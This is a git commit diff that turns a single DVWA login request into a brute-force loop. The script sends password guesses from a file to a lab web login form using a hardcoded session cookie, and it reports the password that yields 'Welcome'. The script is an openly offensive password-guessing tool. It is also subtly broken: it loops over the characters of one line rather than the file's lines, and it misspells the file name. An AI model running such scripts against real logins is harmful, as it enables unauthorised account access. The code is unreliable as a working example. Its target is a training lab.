1d5501e2d3959e249729c121b7aa3bee5a5dc2d4
allensec01 <66871310+allensec01@users.noreply.github.com>
2023-06-12 23:51:48 +0330

    Update simple-brute-force.py

--- simple-brute-force.py
+++ simple-brute-force.py
@@ -2,14 +2,19 @@ import requests
 
 
 url = "http://192.168.254.129/DVWA/vulnerabilities/brute/"
-param = {"username" : "admin" , "password" : "password" ,"Login" :"Login"}
-cookie ={"security":"low", "PHPSESSID":"d80lfk4i81thqk2hhbpppl9a3h"}
-req = requests.get(url,params=param,cookies=cookie)
-txt = req.text
-print(txt)
-if "Welcome" in txt:
-    print("true")
-
+password_file = open("pasword.txt","r")
+password_str = password_file.readline()
+for password in password_str:
+    password = password.replace("\n","")
+    param = {"username" : "admin" , "password" : password ,"Login" :"Login"}
+    cookie ={"security":"low", "PHPSESSID":"d80lfk4i81thqk2hhbpppl9a3h"}
+    # You must get this PHPSESSID from your browser cookie
+    req = requests.get(url,params=param,cookies=cookie)
+    req.cookies
+    txt = req.text
+    print(txt)
+    if "Welcome" in txt:
+        print("password is : ",password)
 
     
             
